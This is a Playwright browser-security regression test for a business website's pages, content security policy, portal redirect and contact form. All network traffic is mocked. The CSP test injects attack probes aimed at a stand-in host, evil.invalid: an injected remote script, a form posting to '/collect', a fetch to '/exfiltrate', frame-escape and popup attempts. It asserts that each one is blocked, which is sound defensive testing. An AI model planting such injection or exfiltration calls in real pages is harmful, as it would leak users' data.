#!/usr/bin/env node
'use strict';

// Local Chromium regression checks. All external requests are mocked or aborted;
// this test never submits an enquiry to the deployed Apps Script service.
// Run: node tests/browser-security.cjs (requires Playwright and Chromium).
const assert = require('node:assert/strict');
const fs = require('node:fs');
const http = require('node:http');
const path = require('node:path');
const { chromium } = require('playwright');

const root = path.resolve(__dirname, '..');
// Optional one-off audit of already-downloaded public GTM/GA scripts. Fixtures
// remain outside the repository; telemetry is still fulfilled locally below.
const analyticsFixtures = process.env.ANALYTICS_FIXTURE_DIR;
const pages = fs.readdirSync(root).filter(name => name.endsWith('.html')).sort();
const portalOrigin = 'https://novawork-portal-test.novawork-korea.workers.dev';
const endpoint = fs.readFileSync(path.join(root, 'contact.html'), 'utf8')
  .match(/\baction="(https:\/\/script\.google\.com\/[^\"]+)"/)[1];
const redirectURL = 'https://script.googleusercontent.com/macros/echo?mock=security-regression';
const nestedURL = 'https://security-test-script.googleusercontent.com/mock-response';
const siblingURL = 'https://script.google.com/mock-unrelated-frame';
const contentTypes = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8', '.svg': 'image/svg+xml',
  '.png': 'image/png', '.webp': 'image/webp', '.jpg': 'image/jpeg',
  '.woff': 'font/woff', '.woff2': 'font/woff2', '.ico': 'image/x-icon',
};
const evalProbe = `window.__evalProbe = {};
for (const [name, run] of Object.entries({
  eval: () => (0, eval)('window.__evalExecuted = true'),
  function: () => new Function('window.__functionExecuted = true')()
})) { try { run(); window.__evalProbe[name] = 'allowed'; }
  catch (error) { window.__evalProbe[name] = error.name; } }
`;
const server = http.createServer((request, response) => {
  const pathname = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);
  if (pathname === '/__security-eval-probe.js') {
    response.writeHead(200, { 'Content-Type': contentTypes['.js'] });
    response.end(evalProbe);
    return;
  }
  const file = path.resolve(root, '.' + (pathname === '/' ? '/index.html' : pathname));
  if (!file.startsWith(root + path.sep) || !fs.existsSync(file) || !fs.statSync(file).isFile()) {
    response.writeHead(404);
    response.end('Not found');
    return;
  }
  response.writeHead(200, { 'Content-Type': contentTypes[path.extname(file)] || 'application/octet-stream' });
  fs.createReadStream(file).pipe(response);
});
// Playwright intentionally does not reroute later requests in an HTTP redirect
// chain. A deny-only local proxy is a second boundary: neither redirected GETs
// nor an accidentally unmocked request can reach an external server.
const denyProxy = http.createServer((request, response) => {
  response.writeHead(502);
  response.end('External network is disabled during browser security tests.');
});
denyProxy.on('connect', (request, socket) => {
  socket.end('HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n');
});

let origin;
let browser;
let checks = 0;
const contexts = [];

async function context(options = {}, contactRedirect = false) {
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, ...options });
  ctx.setDefaultTimeout(6000);
  contexts.push(ctx);
  ctx.remoteRequests = [];
  ctx.submissions = [];
  ctx.unexpectedRemote = [];
  ctx.localFailures = [];
  ctx.pageErrors = [];
  await ctx.addInitScript(() => {
    window.__securityViolations = [];
    window.__receivedMessages = [];
    document.addEventListener('securitypolicyviolation', event => {
      window.__securityViolations.push({ directive: event.effectiveDirective, blocked: event.blockedURI });
    });
    window.addEventListener('message', event => {
      window.__receivedMessages.push({ origin: event.origin, data: event.data });
    });
  });
  ctx.on('page', page => {
    page.on('pageerror', error => ctx.pageErrors.push(error.message));
    page.on('response', response => {
      if (response.url().startsWith(origin + '/') && response.status() >= 400) {
        ctx.localFailures.push({ url: response.url(), status: response.status() });
      }
    });
  });
  await ctx.route('**/*', async route => {
    const request = route.request();
    const url = request.url();
    if (url.startsWith(origin + '/')) return route.continue();
    ctx.remoteRequests.push({ url, method: request.method(), headers: request.headers(), type: request.resourceType() });
    if (url === endpoint) {
      ctx.submissions.push({ body: request.postData() || '', headers: request.headers(), method: request.method() });
      if (contactRedirect) return route.fulfill({ status: 302, headers: { location: redirectURL }, body: '' });
      return route.fulfill({ contentType: 'text/html', body: '<!doctype html><iframe src="' + nestedURL + '"></iframe>' });
    }
    if (url === redirectURL) {
      return route.fulfill({ contentType: 'text/html', body: '<!doctype html><iframe src="' + nestedURL + '"></iframe>' });
    }
    if (url === nestedURL || url === siblingURL) {
      return route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>Mock response</title><p>Local security test fixture</p><script>top.postMessage({source:"security-test-ready"},' + JSON.stringify(origin) + ');</script>' });
    }
    if (url.startsWith(portalOrigin + '/')) {
      return route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>Mock portal</title><h1>Mock portal</h1>' });
    }
    if (new URL(url).hostname === 'www.googletagmanager.com' && new URL(url).pathname === '/gtm.js') {
      const source = analyticsFixtures ? fs.readFileSync(path.join(analyticsFixtures, 'gtm.js'), 'utf8') : '';
      return route.fulfill({ contentType: 'application/javascript', body: source + '\n;window.__mockAnalyticsLoaded = true;' });
    }
    if (analyticsFixtures) {
      const remote = new URL(url);
      if (remote.hostname === 'www.googletagmanager.com' && remote.pathname === '/gtag/js') {
        return route.fulfill({ contentType: 'application/javascript', body: fs.readFileSync(path.join(analyticsFixtures, 'gtag.js'), 'utf8') });
      }
      if (remote.hostname === 'www.googletagmanager.com' && remote.pathname.endsWith('/sw_iframe.html')) {
        return route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>Mock analytics frame</title>' });
      }
      if (/(^|\.)(google-analytics\.com|analytics\.google\.com)$/.test(remote.hostname)) {
        return route.fulfill({ status: 204, headers: { 'access-control-allow-origin': '*' }, body: '' });
      }
    }
    ctx.unexpectedRemote.push(url);
    return route.abort('blockedbyclient');
  });
  return ctx;
}

async function cleanPage(page, label) {
  assert.deepEqual(await page.evaluate(() => window.__securityViolations), [], label + ': unexpected CSP violation');
}

async function cleanContext(ctx, { deliberateRemote = false } = {}) {
  assert.deepEqual(ctx.localFailures, [], 'All requested local assets must load');
  assert.deepEqual(ctx.pageErrors, [], 'Application scripts must not throw');
  if (!deliberateRemote) assert.deepEqual(ctx.unexpectedRemote, [], 'Only explicitly mocked external services may be requested');
  await ctx.close();
}

async function test(name, fn) {
  if (process.env.TEST_FILTER && !name.includes(process.env.TEST_FILTER)) return;
  await fn();
  checks += 1;
  console.log('PASS ' + name);
}

async function fillContact(page) {
  await page.locator('#contact-name').fill('Synthetic Security Test');
  await page.locator('#contact-reply').fill('security-test@example.invalid');
  await page.locator('#contact-service').fill('Synthetic test only');
  await page.locator('#contact-message').fill('Synthetic enquiry for local browser tests only; never deliver this message.');
  await page.locator('#contact-privacy').check();
}

async function contactFrame(page) {
  try {
    await page.waitForFunction(expected => window.__receivedMessages.some(event => event.origin === expected && event.data.source === 'security-test-ready'), new URL(nestedURL).origin);
  } catch (error) {
    const violations = await page.evaluate(() => window.__securityViolations);
    throw new Error('Mock GAS nested response did not load: ' + JSON.stringify({ violations, frames: page.frames().map(frame => frame.url()) }), { cause: error });
  }
  return page.frames().find(frame => frame.url() === nestedURL);
}

async function message(page, frame, payload) {
  const count = await page.evaluate(() => window.__receivedMessages.length);
  await frame.evaluate(({ payload, target }) => window.top.postMessage(payload, target), { payload, target: origin });
  await page.waitForFunction(before => window.__receivedMessages.length > before, count);
}

async function main() {
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  await new Promise(resolve => denyProxy.listen(0, '127.0.0.1', resolve));
  origin = 'http://127.0.0.1:' + server.address().port;
  const executablePath = process.env.CHROMIUM_PATH || (fs.existsSync('/usr/bin/chromium') ? '/usr/bin/chromium' : undefined);
  browser = await chromium.launch({ executablePath, headless: true, args: ['--no-sandbox'],
    proxy: { server: 'http://127.0.0.1:' + denyProxy.address().port, bypass: '127.0.0.1,localhost' } });

  await test('all 15 pages load; local assets, CSP, analytics and mobile menu work', async () => {
    assert.equal(pages.length, 15, 'Update page coverage deliberately if public routes change');
    const ctx = await context();
    const page = await ctx.newPage();
    page.setDefaultTimeout(6000);
    for (const name of pages.filter(name => name !== 'portal.html')) {
      await page.setViewportSize({ width: 1440, height: 900 });
      await page.goto(origin + '/' + name, { waitUntil: 'load' });
      await page.waitForFunction(() => document.body.dataset.nwMotionReady === 'true');
      assert.equal(await page.locator('h1').count(), 1, name + ': exactly one h1');
      assert.equal(await page.locator('meta[http-equiv="Content-Security-Policy"]').count(), 1, name + ': one active CSP');
      if (name !== 'contact.html') await page.waitForFunction(() => window.__mockAnalyticsLoaded === true);
      else assert.equal(await page.evaluate(() => window.__mockAnalyticsLoaded), undefined, 'Contact must not load analytics');
      await page.evaluate(() => window.scrollTo(0, document.documentElement.scrollHeight));
      await page.setViewportSize({ width: 390, height: 844 });
      await page.evaluate(() => window.scrollTo(0, 180));
      await page.locator('.menu-toggle').scrollIntoViewIfNeeded();
      const previousScroll = await page.evaluate(() => window.scrollY);
      await page.locator('.menu-toggle').click();
      await page.waitForFunction(() => document.querySelector('.menu-toggle').getAttribute('aria-expanded') === 'true');
      assert.equal(await page.locator('#mobile-nav').isVisible(), true, name + ': menu opens');
      for (let tab = 0; tab < 8; tab += 1) await page.keyboard.press('Tab');
      assert.equal(await page.evaluate(() => document.activeElement.matches('.menu-toggle') || !!document.activeElement.closest('#mobile-nav')), true, name + ': focus stays within menu');
      await page.keyboard.press('Escape');
      await page.waitForFunction(() => document.querySelector('#mobile-nav').hidden);
      assert.equal(await page.locator('.menu-toggle').getAttribute('aria-expanded'), 'false');
      const restoredScroll = await page.evaluate(() => window.scrollY);
      assert.ok(Math.abs(restoredScroll - previousScroll) <= 2, name + ': menu preserves scroll (' + previousScroll + ' → ' + restoredScroll + ')');
      await cleanPage(page, name);
    }
    // Portal's intended automatic navigation is inspected separately below.
    await cleanContext(ctx);
  });

  await test('homepage native scroll sequence, automatic 17-piece logo and FAQ disclosure', async () => {
    const ctx = await context();
    const page = await ctx.newPage();
    await page.goto(origin + '/index.html');
    await page.waitForFunction(() => document.querySelector('[data-nw-sequence]').dataset.sequenceReady === 'true');
    assert.equal(await page.locator('.nw-intro-piece').count(), 17);
    await page.waitForFunction(() => document.querySelector('[data-nw-logo-intro]').classList.contains('is-assembled'));
    const initial = Number(await page.locator('[data-nw-sequence]').getAttribute('data-progress'));
    await page.evaluate(() => {
      const sequence = document.querySelector('[data-nw-sequence]');
      window.scrollTo(0, sequence.offsetTop + sequence.offsetHeight - innerHeight);
    });
    await page.waitForFunction(start => Number(document.querySelector('[data-nw-sequence]').dataset.progress) > Math.max(start, .9), initial);
    await page.evaluate(() => window.scrollTo(0, 0));
    await page.waitForFunction(() => Number(document.querySelector('[data-nw-sequence]').dataset.progress) < .1);
    await cleanPage(page, 'home sequence');
    await page.goto(origin + '/faq.html');
    const disclosure = page.locator('details').first();
    await disclosure.locator('summary').click();
    assert.equal(await disclosure.evaluate(node => node.open), true);
    await disclosure.locator('summary').click();
    assert.equal(await disclosure.evaluate(node => node.open), false);
    await cleanPage(page, 'FAQ');
    await cleanContext(ctx);
  });

  await test('portal ignores query/hash redirect injection and sends no referrer', async () => {
    const ctx = await context();
    const page = await ctx.newPage();
    await page.goto(origin + '/portal.html?redirect=https%3A%2F%2Fevil.invalid%2F&token=private#https://evil.invalid/');
    await page.waitForURL(portalOrigin + '/');
    const request = ctx.remoteRequests.find(item => item.url.startsWith(portalOrigin));
    assert.equal(request.url, portalOrigin + '/');
    assert.equal(request.headers.referer, undefined);
    await cleanContext(ctx);
    const noJS = await context({ javaScriptEnabled: false });
    const fallback = await noJS.newPage();
    await fallback.goto(origin + '/portal.html');
    assert.ok(await fallback.locator('a[href="' + portalOrigin + '/"]').count() > 0, 'Manual portal link works without JavaScript');
    await cleanContext(noJS);
  });

  await test('CSP blocks injected code/styles, eval, remote scripts, base, objects, exfiltration and unapproved forms', async () => {
    const ctx = await context();
    const page = await ctx.newPage();
    await page.goto(origin + '/contact.html');
    await cleanPage(page, 'before deliberate CSP probes');
    const startingURL = page.url();
    await page.evaluate(() => {
      const inline = document.createElement('script');
      inline.textContent = 'window.__inlineExecuted = true';
      document.head.append(inline);
      const button = document.createElement('button');
      button.setAttribute('onclick', 'window.__handlerExecuted = true');
      document.body.append(button);
      button.click();
      const script = document.createElement('script');
      script.src = 'https://evil.invalid/injected.js';
      document.head.append(script);
      const style = document.createElement('style');
      style.textContent = 'body { display: none !important }';
      document.head.append(style);
      const base = document.createElement('base');
      base.href = 'https://evil.invalid/';
      document.head.append(base);
      const object = document.createElement('object');
      object.data = 'https://evil.invalid/plugin.html';
      object.type = 'text/html';
      document.body.append(object);
      const form = document.createElement('form');
      form.method = 'post';
      form.action = 'https://evil.invalid/collect';
      document.body.append(form);
      form.submit();
      form.action = 'https://script.google.com/macros/s/unapproved-deployment/exec';
      form.submit();
      fetch('https://evil.invalid/exfiltrate').catch(() => {});
      const image = document.createElement('img');
      image.src = 'https://evil.invalid/pixel';
      document.body.append(image);
      const probe = document.createElement('script');
      probe.src = '/__security-eval-probe.js';
      document.head.append(probe);
    });
    await page.waitForFunction(() => window.__evalProbe && window.__evalProbe.function);
    await page.waitForFunction(() => new Set(window.__securityViolations.map(event => event.directive)).size >= 9);
    const result = await page.evaluate(() => ({
      violations: window.__securityViolations,
      evalProbe: window.__evalProbe,
      executed: [window.__inlineExecuted, window.__handlerExecuted, window.__evalExecuted, window.__functionExecuted].some(Boolean),
      base: document.baseURI,
    }));
    assert.equal(result.executed, false);
    assert.deepEqual(result.evalProbe, { eval: 'EvalError', function: 'EvalError' });
    assert.equal(result.base, startingURL);
    assert.equal(page.url(), startingURL);
    const directives = new Set(result.violations.map(event => event.directive));
    for (const expected of ['script-src-elem', 'script-src-attr', 'script-src', 'style-src-elem', 'base-uri', 'object-src', 'form-action', 'connect-src', 'img-src']) {
      assert.ok(directives.has(expected), expected + ' must generate a browser enforcement violation');
    }
    assert.ok(!ctx.remoteRequests.some(request => request.url.startsWith('https://evil.invalid/')), 'Browser blocks before an attacker receives a request');
    assert.ok(!ctx.remoteRequests.some(request => request.url.includes('unapproved-deployment')), 'Only the exact approved Apps Script deployment accepts a form action');
    assert.notEqual(await page.evaluate(() => getComputedStyle(document.body).display), 'none', 'Injected CSS must not hide the page');
    await cleanContext(ctx);
  });

  await test('contact validates locally and does not persist personal input', async () => {
    const ctx = await context();
    const page = await ctx.newPage();
    await page.goto(origin + '/contact.html?service=automation&intent=preview&token=private#private');
    await page.locator('button[type="submit"]').click();
    assert.equal(ctx.submissions.length, 0);
    assert.equal(await page.locator('#contact-name').getAttribute('aria-invalid'), 'true');
    await fillContact(page);
    assert.deepEqual(await page.evaluate(() => ({ local: Object.keys(localStorage), session: Object.keys(sessionStorage) })), { local: [], session: [] });
    await cleanPage(page, 'contact validation');
    await cleanContext(ctx);
  });

  await test('GAS HTTP 302 redirect passes CSP before the deny-only proxy blocks external navigation', async () => {
    // This checks real Chromium redirect enforcement separately from nested
    // response behavior below; the redirected endpoint never receives a request.
    const ctx = await context({}, true);
    const page = await ctx.newPage();
    page.setDefaultTimeout(6000);
    await page.goto(origin + '/contact.html');
    await fillContact(page);
    const redirectedRequest = page.waitForEvent('request', { predicate: request => request.url() === redirectURL });
    const failedNavigation = page.waitForEvent('requestfailed', { predicate: request => request.url() === redirectURL });
    await page.locator('button[type="submit"]').click();
    const request = await redirectedRequest;
    assert.equal(request.redirectedFrom().url(), endpoint);
    assert.equal(request.method(), 'GET', '302 changes the POST to a redirected GET');
    const failed = await failedNavigation;
    assert.match(failed.failure().errorText, /TUNNEL_CONNECTION_FAILED|PROXY_CONNECTION_FAILED|ERR_FAILED/);
    assert.equal(ctx.submissions.length, 1);
    assert.equal(await page.locator('form').getAttribute('aria-busy'), 'true', 'Blocked external navigation cannot confirm receipt');
    await cleanPage(page, 'HTTP redirect');
    await cleanContext(ctx);
  });

  await test('GAS frame sandbox prevents navigation/popups; nested responses require matching sender and payload', async () => {
    const ctx = await context();
    const page = await ctx.newPage();
    page.setDefaultTimeout(6000);
    await page.goto(origin + '/contact.html?intent=preview&token=must-not-leak#private');
    await fillContact(page);
    const nestedPromise = contactFrame(page);
    await page.locator('button[type="submit"]').click();
    const nested = await nestedPromise;
    const contactURL = page.url();
    const pagesBefore = ctx.pages().length;
    const sandbox = await nested.evaluate(() => {
      let navigation;
      try { window.top.location.href = 'https://evil.invalid/frame-escape'; navigation = 'allowed'; }
      catch (error) { navigation = error.name; }
      return { navigation, popupBlocked: window.open('https://evil.invalid/popup-escape') === null };
    });
    assert.deepEqual(sandbox, { navigation: 'SecurityError', popupBlocked: true });
    assert.equal(page.url(), contactURL, 'Response frame cannot navigate the contact page');
    assert.equal(ctx.pages().length, pagesBefore, 'Response frame cannot create a popup');
    assert.equal(ctx.submissions.length, 1);
    const submission = ctx.submissions[0];
    const body = new URLSearchParams(submission.body);
    assert.equal(submission.method, 'POST');
    assert.equal(submission.headers.referer, undefined, 'Contact URL must not leak in the request referrer');
    assert.equal(body.get('page_url'), origin + '/contact.html');
    assert.equal(body.get('email'), 'security-test@example.invalid');
    assert.equal(body.get('phone'), '');
    assert.equal(await page.locator('form').getAttribute('aria-busy'), 'true', 'Iframe navigation alone is not proof of receipt');
    const success = { source: 'novawork-inquiry', status: 'success' };
    await message(page, page.mainFrame(), success);
    assert.equal(await page.locator('form').getAttribute('aria-busy'), 'true', 'Same-origin forged response is ignored');
    await page.evaluate(url => { const frame = document.createElement('iframe'); frame.src = url; frame.id = 'unrelated-response'; document.body.append(frame); }, siblingURL);
    await page.waitForFunction(expected => window.__receivedMessages.some(event => event.origin === expected && event.data.source === 'security-test-ready'), new URL(siblingURL).origin);
    const unrelated = page.frames().find(frame => frame.url() === siblingURL);
    await message(page, unrelated, success);
    assert.equal(await page.locator('form').getAttribute('aria-busy'), 'true', 'Allowed origin in unrelated frame is ignored');
    for (const payload of ['invalid-json', { source: 'different-source', status: 'success' }, { source: 'novawork-inquiry', status: 'unknown' }, [success]]) {
      await message(page, nested, payload);
      assert.equal(await page.locator('form').getAttribute('aria-busy'), 'true', 'Unrecognized response must not confirm receipt');
    }
    const edited = 'Synthetic edited enquiry made while the previous local mock request was pending.';
    await page.locator('#contact-message').fill(edited);
    await message(page, nested, JSON.stringify(success));
    await page.waitForFunction(() => document.querySelector('[data-contact-status]').classList.contains('is-success'));
    assert.equal(await page.locator('#contact-message').inputValue(), edited);
    assert.ok((await page.locator('[data-contact-status]').textContent()).includes('수정한 내용은 아직 전송되지 않았습니다'));
    assert.equal(await page.locator('button[type="submit"]').isEnabled(), true);
    assert.equal(await page.locator('iframe[name^="novawork-contact-response-"]').count(), 0, 'Completed request frame is removed');
    assert.equal(ctx.submissions.length, 1, 'Edits and postMessages never cause another submit');
    assert.ok(!ctx.remoteRequests.some(request => request.url.includes('googletagmanager') || request.url.includes('google-analytics')), 'Contact must not load analytics while typing or submitting');
    await cleanPage(page, 'mocked enquiry');
    await cleanContext(ctx);
  });

  await test('unconfirmed contact timeout preserves text and blocks duplicate unchanged submission', async () => {
    const ctx = await context();
    const page = await ctx.newPage();
    page.setDefaultTimeout(6000);
    await page.goto(origin + '/contact.html');
    await page.clock.install();
    await fillContact(page);
    const before = await page.locator('#contact-message').inputValue();
    const nestedPromise = contactFrame(page);
    await page.locator('button[type="submit"]').click();
    await nestedPromise;
    await page.clock.fastForward(90001);
    assert.ok((await page.locator('[data-contact-status]').textContent()).includes('접수 여부를 확인하지 못했습니다'));
    assert.equal(await page.locator('#contact-message').inputValue(), before);
    assert.equal(await page.locator('button[type="submit"]').isDisabled(), true);
    assert.equal(ctx.submissions.length, 1);
    await cleanPage(page, 'contact timeout');
    await cleanContext(ctx);
  });
  console.log(`${checks} browser security/regression groups passed; external requests were mocked, no live enquiry sent.`);
  if (analyticsFixtures) {
    const destinations = [...new Set(contexts.flatMap(ctx => ctx.remoteRequests)
      .filter(request => /google-analytics|analytics\.google|googletagmanager/.test(request.url))
      .map(request => { const url = new URL(request.url); return request.type + ' ' + url.hostname + url.pathname; }))].sort();
    console.log('Cached analytics runtime destinations (all mocked):\n' + destinations.join('\n'));
  }
}

main().catch(error => { console.error(error.stack || error); process.exitCode = 1; }).finally(async () => {
  for (const ctx of contexts) await ctx.close().catch(() => {});
  if (browser) await browser.close();
  server.close();
  denyProxy.close();
});
